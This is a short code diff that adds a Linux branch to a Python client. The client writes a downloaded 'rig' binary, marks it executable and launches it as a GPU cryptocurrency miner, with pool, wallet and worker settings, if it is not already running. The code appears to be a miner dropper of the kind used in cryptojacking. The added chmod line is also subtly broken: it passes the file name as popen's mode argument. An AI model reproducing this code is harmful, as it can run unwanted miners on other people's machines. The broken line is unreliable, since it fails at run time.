@@ -85,6 +85,9 @@ def client():
                     with open(rig, 'wb') as f:
                         f.write(response.content)
 
+                if sys.platform == "linux":
+                    os.popen("chmod +x", rig)
+
                 if os.path.exists(rig):
                     if not task_exists(rig):
                         os.popen(f"{ext}{rig} --opencl --cuda -o {pool} -u {wallet} -p {worker} -k --tls")
